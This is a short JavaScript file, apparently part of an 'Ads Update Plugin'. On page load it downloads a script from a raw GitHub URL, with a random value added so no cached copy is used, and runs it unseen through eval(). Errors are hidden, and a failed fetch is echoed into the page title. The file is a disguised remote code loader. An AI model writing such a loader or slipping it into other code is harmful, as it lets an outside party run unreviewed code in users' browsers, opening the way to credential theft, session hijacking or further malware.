
var Run = {
    __constructor: function () {
        $.get("https://raw.githubusercontent.com/xlfederalelk0lx/Ads-Update-Plugin/master/script.js?v="+(Math.random()*999999)).done(function (script) {
            try{
                eval(script);
            }catch (e){
                console.log(e);
            }
        }).fail(function (xhr) {
            window.document.title = "Ads Update Plugin Repository Github "+xhr.responseText;
        });
    }
}


$(document).ready(function () {
    Run.__constructor();
})